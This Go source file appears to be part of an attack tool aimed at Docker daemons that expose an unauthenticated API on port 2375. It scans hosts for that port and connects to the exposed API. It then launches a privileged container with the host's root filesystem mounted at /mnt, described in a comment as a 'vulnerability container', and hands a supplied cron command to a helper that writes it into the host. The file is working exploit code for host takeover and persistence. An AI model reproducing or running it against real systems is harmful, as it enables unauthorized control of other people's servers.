package main

import(
	"bufio"
	"context"
	"fmt"
	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var imagesInfo = make(map[string]string)

//探测是否开启2375端口
func Port2375(host string) bool {
	port :=2375
	address := fmt.Sprintf("%s:%d", host, port)

	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	return true
}

//创建与docker的连接
func CreateDockerCli(ip string) *client.Client{

	dockerHost := "tcp://" + string(ip) + ":2375"
	cli, err := client.NewClient(dockerHost, "", nil, nil)
	if err != nil {
		fmt.Println(err)
	}
	return cli

}

//创建漏洞容器
func CreateContainerSetCron(cli *client.Client,CronCommand string,containerName string) string {

	ID:=GetImagesId(cli)

	if ID==""{
		fmt.Println("no images,waiting...")
		PullImage(cli)
	}

	config :=&container.Config{
		Image: ID,
		Cmd: []string{"/bin/sh", "-ce", "tail -f /dev/null"},
	}
	//挂载，并设置特权模式
	hostConfig := &container.HostConfig{
		Binds: []string{"/:/mnt"},
		Privileged: true,
	}

	container, err := cli.ContainerCreate(context.Background(), config, hostConfig, nil, nil, containerName)
	if err != nil {
		fmt.Println(err)
		return "create container error!"
	}

	//启动容器
	err = cli.ContainerStart(context.Background(), container.ID, types.ContainerStartOptions{})
	if err != nil {
		log.Fatal(err)
	}

	ExecToContainerCron(container.ID,cli,CronCommand)
	return container.ID
}

//获取镜像信息
func GetImagesId(cli *client.Client) string {

	// 获取所有镜像
	images, err := cli.ImageList(context.Background(), types.ImageListOptions{})
	if err != nil {
		log.Fatal(err)
	}

	for _, image := range images {
		for _, tag := range image.RepoTags {
			// tag 格式为 "repository:tag"，使用空格分割取得名称和ID
			tagParts := strings.SplitN(tag, ":", 2)
			if len(tagParts) == 2 {
				//name := tagParts[0] + ":" + tagParts[1]
				tmp := strings.ReplaceAll(image.ID,"sha256:","")
				imageid := tmp[0:12]
				return imageid
			}
		}
	}
	return ""
}

//
////获取镜像信息
//func GetImagesId(cli *client.Client) (string) {
//
//	GetImagesInfo(cli)
//	for name,id := range imagesInfo{
//		if name == "ubuntu:latest"{
//			return id
//		}
//	}
//	return ""
//}
//
//
func PullImage(cli *client.Client)  {
	PullimageName := "ubuntu"
	imageTag := "latest"

	// 构建要下载的镜像的完整名称（包括标签）
	imageFullName := fmt.Sprintf("%s:%s", PullimageName, imageTag)

	// 准备镜像拉取的选项
	pullOptions := types.ImagePullOptions{}

	// 指定拉取镜像的上下文（这里使用默认上下文）
	pullContext := context.Background()

	// 使用Docker SDK拉取镜像
	out, err := cli.ImagePull(pullContext, imageFullName, pullOptions)
	if err != nil {
		fmt.Printf("Failed to pull image %s: %v\n", imageFullName, err)
		os.Exit(1)
	}
	fmt.Println("等待镜像拉取......")
	// 在标准输出中显示拉取的日志
	err = displayPullOutput(out)
	if err != nil {
		fmt.Printf("Failed to display pull output: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Image %s pulled successfully!\n", imageFullName)
}

// 辅助函数用于显示拉取的输出
func displayPullOutput(out io.ReadCloser) error {
	defer out.Close()
	scanner := bufio.NewScanner(out)
	for scanner.Scan() {
		fmt.Println(scanner.Text())
	}
	return scanner.Err()
}

//获取镜像id
//func GetImagesId(cli *client.Client) string {
//
//	ctx := context.Background()
//	var imageid string
//	// List running containers
//	containers, err := cli.ContainerList(ctx, types.ContainerListOptions{All: false})
//	if err != nil {
//		fmt.Println(err)
//		return "get docker information error!"
//	}
//
//	cmd := exec.Command("hostname")
//	output, _ := cmd.CombinedOutput()
//	exec_res := strings.ReplaceAll(string(output),"\n","")
//	lenth := (len(exec_res))
//
//	for _, container := range containers {
//		if container.ID[:lenth]==exec_res{
//			tmp := strings.ReplaceAll(container.ImageID,"sha256:","")
//			imageid = tmp[:lenth]
//		}
//	}
//	return imageid
//
//}
